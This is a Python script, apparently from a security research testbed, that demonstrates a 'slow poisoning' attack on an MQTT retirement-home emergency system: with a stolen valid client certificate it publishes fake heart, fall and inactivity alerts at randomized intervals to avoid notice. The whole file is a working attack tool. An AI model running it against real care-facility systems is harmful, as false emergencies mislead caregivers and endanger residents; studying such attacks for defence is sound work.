
"""
Attack Scenario 5: Slow Poisoning via MQTT (TLS bypass demonstration).

Simulates a slow poisoning attack where an adversary with a valid (stolen)
certificate publishes fake emergency alerts at realistic intervals,
bypassing TLS authentication.

Usage:
    python attack5_slow_poisoning.py

Environment variables:
    BG_BROKER_HOST       MQTT broker hostname        (default: localhost)
    BG_BROKER_PORT       MQTT broker port            (default: 8883)
    BG_CERTS_DIR         Path to TLS cert directory  (default: clients/certs)
    BG_FAST_MODE         1 = fast demo, 0 = paper    (default: 1)
    BG_ATTACK5_OUTPUT    Output JSON path            (default: baseline_data/attack5_slow_poisoning.json)

Fast mode (BG_FAST_MODE=1): 6 alerts, 5-15 s intervals (~1 min total)
Paper mode (BG_FAST_MODE=0): 20 alerts, 300-600 s intervals (~2 h total)
"""

import json
import logging
import os
import random
import ssl
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("attack5")

BROKER_HOST = os.getenv("BG_BROKER_HOST", "localhost")
BROKER_PORT = int(os.getenv("BG_BROKER_PORT", "8883"))

CERTS_DIR   = os.getenv("BG_CERTS_DIR", "clients/certs")
CA_CERT     = os.path.join(CERTS_DIR, "ca.crt")
CLIENT_CERT = os.path.join(CERTS_DIR, "client.crt")
CLIENT_KEY  = os.path.join(CERTS_DIR, "client.key")

OUTPUT_JSON = os.getenv("BG_ATTACK5_OUTPUT", "baseline_data/attack5_slow_poisoning.json")
RANDOM_SEED = int(os.getenv("BG_SEED", "42"))

FAST_MODE = os.getenv("BG_FAST_MODE", "1") == "1"

if FAST_MODE:
    NUM_ALERTS   = int(os.getenv("BG_NUM_ALERTS", "6"))
    MIN_INTERVAL = int(os.getenv("BG_MIN_INTERVAL", "5"))
    MAX_INTERVAL = int(os.getenv("BG_MAX_INTERVAL", "15"))
else:
    NUM_ALERTS   = int(os.getenv("BG_NUM_ALERTS", "20"))
    MIN_INTERVAL = int(os.getenv("BG_MIN_INTERVAL", "300"))
    MAX_INTERVAL = int(os.getenv("BG_MAX_INTERVAL", "600"))

ATTACK_TOPICS = [
    "retirement/emergency/heart",
    "retirement/emergency/fall",
    "retirement/emergency/inactivity",
]

EMERGENCY_WEIGHTS = {"heart": 0.5, "fall": 0.3, "inactivity": 0.2}

REALISTIC_MESSAGES = {
    "heart": [
        "Heart rate: {hr} bpm - Elevated",
        "Irregular heartbeat detected - Rate: {hr} bpm",
        "Heart rate spike: {hr} bpm",
    ],
    "fall": [
        "Sudden acceleration detected - Possible fall",
        "Impact sensor triggered - Fall suspected",
        "Patient down - Fall detector activated",
    ],
    "inactivity": [
        "No movement detected for 3 hours",
        "Extended inactivity period - Check patient",
        "Inactivity alert - 4 hour threshold exceeded",
    ],
}


def build_message(rng: random.Random, etype: str) -> str:
    template = rng.choice(REALISTIC_MESSAGES[etype])
    if etype == "heart":
        hr = rng.randint(45, 175)
        return template.format(hr=hr)
    return template


def print_summary(results: dict) -> None:
    rows = [
        ("Attack name",        results["attack_name"]),
        ("Mode",               results["mode"]),
        ("Timestamp (UTC)",    results["timestamp"]),
        ("Broker",             results["broker"]),
        ("Alerts planned",     str(results["num_alerts_planned"])),
        ("Interval range (s)", f"{results['interval_range_s'][0]}–{results['interval_range_s'][1]}"),
        ("Total attempts",     str(results["total_attempts"])),
        ("Successful",         str(results["successful_publishes"])),
        ("Failed",             str(results["failed_publishes"])),
        ("Duration (s)",       str(results["attack_duration_s"])),
        ("Avg interval (s)",   str(results["avg_interval_s"])),
        ("TLS blocked",        str(results["tls_blocked"])),
    ]
    col1 = max(len(r[0]) for r in rows)
    col2 = max(len(r[1]) for r in rows)
    sep  = f"+{'-' * (col1 + 2)}+{'-' * (col2 + 2)}+"
    print(sep)
    print(f"| {'Parameter':<{col1}} | {'Value':<{col2}} |")
    print(sep)
    for label, value in rows:
        print(f"| {label:<{col1}} | {value:<{col2}} |")
    print(sep)


def main() -> None:
    rng = random.Random(RANDOM_SEED)
    os.makedirs(os.path.dirname(OUTPUT_JSON), exist_ok=True)

    mode_label = "fast-demo" if FAST_MODE else "paper"
    log.info("Attack 5 — Slow Poisoning [mode=%s]", mode_label)
    log.info("Broker: %s:%d | alerts=%d | interval=[%d, %d] s",
             BROKER_HOST, BROKER_PORT, NUM_ALERTS, MIN_INTERVAL, MAX_INTERVAL)

    for label, path in [("CA cert", CA_CERT), ("client cert", CLIENT_CERT), ("client key", CLIENT_KEY)]:
        if not os.path.exists(path):
            log.error("Missing %s: %s  (set BG_CERTS_DIR to override)", label, path)
            raise FileNotFoundError(path)

    results = {
        "attack_name": "slow_poisoning",
        "mode": mode_label,
        "timestamp": datetime.now(tz=timezone.utc).isoformat(),
        "broker": f"{BROKER_HOST}:{BROKER_PORT}",
        "num_alerts_planned": NUM_ALERTS,
        "interval_range_s": [MIN_INTERVAL, MAX_INTERVAL],
        "total_attempts": 0,
        "successful_publishes": 0,
        "failed_publishes": 0,
        "attack_duration_s": 0.0,
        "avg_interval_s": 0.0,
        "tls_blocked": False,
    }

    published_count = [0]

    def on_connect(client, userdata, flags, rc, properties=None):
        if rc == 0:
            log.info("Connected to broker (certificate accepted — attack proceeds)")
        else:
            log.warning("Connection rejected (rc=%d)", rc)

    def on_publish(client, userdata, mid, properties=None):
        published_count[0] += 1

    client = mqtt.Client(client_id="slow_poison_attacker", protocol=mqtt.MQTTv5)
    client.on_connect = on_connect
    client.on_publish = on_publish

    log.info("Configuring TLS...")
    client.tls_set(
        ca_certs=CA_CERT,
        certfile=CLIENT_CERT,
        keyfile=CLIENT_KEY,
        cert_reqs=ssl.CERT_REQUIRED,
        tls_version=ssl.PROTOCOL_TLS,
        ciphers=None,
    )
    client.tls_insecure_set(False)

    log.info("Connecting to %s:%d...", BROKER_HOST, BROKER_PORT)
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()
        time.sleep(2)
    except Exception as exc:
        log.error("Connection failed: %s", exc)
        raise

    start_time = time.time()
    intervals: list[float] = []

    try:
        for i in range(NUM_ALERTS):
            results["total_attempts"] += 1

            etype = rng.choices(
                list(EMERGENCY_WEIGHTS.keys()),
                weights=list(EMERGENCY_WEIGHTS.values()),
            )[0]
            topic   = ATTACK_TOPICS[["heart", "fall", "inactivity"].index(etype)]
            message = build_message(rng, etype)

            try:
                client.publish(topic, message, qos=1)
                results["successful_publishes"] += 1
                elapsed = (time.time() - start_time) / 60
                log.info("[%2d/%d] %-12s | %.1f min | %s",
                         i + 1, NUM_ALERTS, etype, elapsed, message[:60])
            except Exception as exc:
                log.warning("Publish error: %s", exc)
                results["failed_publishes"] += 1

            if i < NUM_ALERTS - 1:
                wait = rng.randint(MIN_INTERVAL, MAX_INTERVAL)
                intervals.append(wait)
                log.info("Waiting %d s before next alert...", wait)
                time.sleep(wait)

    except KeyboardInterrupt:
        log.info("Interrupted by user.")

    finally:
        time.sleep(1)
        client.loop_stop()
        client.disconnect()

    results["attack_duration_s"] = round(time.time() - start_time, 1)
    results["avg_interval_s"]    = round(sum(intervals) / len(intervals), 1) if intervals else 0.0

    print_summary(results)

    with open(OUTPUT_JSON, "w") as fh:
        json.dump(results, fh, indent=2)
    log.info("Results saved: %s", OUTPUT_JSON)


if __name__ == "__main__":
    main()
